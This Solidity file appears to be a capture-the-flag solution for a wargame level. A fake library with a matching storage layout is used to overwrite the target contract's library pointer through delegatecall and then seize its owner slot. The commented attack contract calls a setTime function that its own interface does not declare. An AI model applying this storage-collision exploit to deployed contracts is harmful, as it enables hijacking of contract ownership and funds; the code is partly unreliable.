// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}

contract FakeLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        address _owner = address(uint160(_time));
        owner = _owner;
    }
}

// after setting the 
// contract Attack {
//     IPreservation public preservation;

//     constructor(address _preservation) public {
//         preservation = IPreservation(_preservation);
//     }

//     function attack(address _fakeLibrary) public {
//         uint256 fake = uint256(uint160(_fakeLibrary));
//         preservation.setFirstTime(fake);

//         preservation.setTime(uint256(uint160(msg.sender)));
//     } 
// }